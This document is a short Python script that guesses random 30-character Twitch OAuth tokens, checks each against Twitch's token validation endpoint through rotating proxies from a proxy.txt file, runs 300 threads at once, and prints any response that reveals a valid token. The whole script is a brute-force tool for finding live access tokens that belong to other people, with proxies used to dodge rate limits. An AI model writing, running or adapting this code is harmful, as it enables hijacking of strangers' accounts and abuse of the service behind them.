import requests
from random import choice
import string
import random
import time
from threading import Thread

endpoint = 'https://id.twitch.tv/oauth2/validate'

def token_input():
    tokens = []
    for i in range(100):
        token = (''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(30)))
        tokens.append({'Authorization': f'OAuth {token}'})
    return tokens

def token_output(token_list):
    for element in token_list:
        with open("proxy.txt", "r") as prox:
            proxies_list=prox.readlines()
        proxies = {
            "http":"http://{}".format(choice(proxies_list))
        }
        try:
            res = requests.get(endpoint, headers=element, proxies=proxies)
            login = res.json().get('login')
            time.sleep(1)
            if "client_id" in res.text:
                print(res.text)
        except Exception:
            print("error cargando proxy!")
            pass

tokens = token_input()
for _ in range(300):
    t = Thread(target=token_output, args=(token_input(),))
    t.start()
